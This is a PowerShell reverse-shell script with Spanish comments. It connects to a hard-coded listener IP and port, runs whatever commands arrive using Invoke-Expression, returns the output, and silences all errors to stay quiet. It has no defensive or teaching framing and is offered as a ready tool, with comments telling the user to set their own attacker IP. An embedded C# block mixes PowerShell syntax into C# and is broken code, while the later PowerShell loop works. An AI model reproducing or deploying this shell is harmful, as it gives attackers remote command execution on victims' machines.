# Configurar el entorno para suprimir todos los errores visibles
$ErrorActionPreference = "SilentlyContinue"  # Suprime errores en rojo

$payload = @"
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

public class Shell {
    static void Main() {
        string $LHOST = "192.168.1.160"; #Cambiar IP
        int $LPORT = 9999; #Cambiar Puerto
        System.Net.Sockets.TCPClient $TCPClient = new System.Net.Sockets.TCPClient($LHOST, $LPORT);
        System.IO.Stream $NetworkStream = $TCPClient.GetStream();
        System.IO.StreamReader $StreamReader = new IO.StreamReader($NetworkStream);
        System.IO.StreamWriter $StreamWriter = new IO.StreamWriter($NetworkStream);
        $StreamWriter.AutoFlush = true;
        byte[] $Buffer = new byte[1024];
        while ($TCPClient.Connected) {
            try {
                while ($NetworkStream.DataAvailable) {
                    int $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length);
                    string $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData -1);
                    if ($Code.Length -gt 0) {
                        string $Output = try {
                            Invoke-Expression ($Code); 
                        } catch {
                            # Suprime el error
                        };
                        if (-not [string]::IsNullOrEmpty($Output)) {
                            $StreamWriter.Write("$Output`n");
                        }
                    }
                }
            } catch {
                # Captura de errores en el ciclo
                continue;
            }
        }
        $TCPClient.Close();
        $NetworkStream.Close();
        $StreamReader.Close();
        $StreamWriter.Close();
    }
}
"@

Add-Type $payload 2>$null  # Redirige errores en la compilación

$LHOST = "192.168.1.160" #Cambiar IP
$LPORT = 9999 #Cambiar Puerto
$TCPClient = $null
$NetworkStream = $null
$StreamReader = $null
$StreamWriter = $null

try {
    $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT) 2>$null  # Redirige errores de conexión
    $NetworkStream = $TCPClient.GetStream() 2>$null
    $StreamReader = New-Object IO.StreamReader($NetworkStream) 2>$null
    $StreamWriter = New-Object IO.StreamWriter($NetworkStream) 2>$null
    $StreamWriter.AutoFlush = $true
    $Buffer = New-Object System.Byte[] 1024

    while ($TCPClient.Connected) {
        try {
            while ($NetworkStream.DataAvailable) {
                $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length) 2>$null  # Redirige posibles errores
                $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData -1) 2>$null
            }

            if ($TCPClient.Connected -and $Code.Length -gt 1) {
                $Output = try {
                    Invoke-Expression ($Code) 2>$null  # Redirige errores de ejecución
                } catch {
                    # Suprime el error
                }
                if (-not [string]::IsNullOrEmpty($Output)) {
                    $StreamWriter.Write("$Output`n")
                }
                $Code = $null
            }
        } catch {
            # Captura de errores dentro del bucle
            continue
        }
    }
} catch {
    # Manejo de errores de conexión
} finally {
    # Cierre seguro de la conexión y los streams
    if ($TCPClient -ne $null) {
        $TCPClient.Close() 2>$null  # Redirige cualquier error de cierre
    }
    if ($NetworkStream -ne $null) {
        $NetworkStream.Close() 2>$null
    }
    if ($StreamReader -ne $null) {
        $StreamReader.Close() 2>$null
    }
    if ($StreamWriter -ne $null) {
        $StreamWriter.Close() 2>$null
    }
}

# Restaurar ErrorActionPreference al valor predeterminado después de la ejecución
$ErrorActionPreference = "Continue"
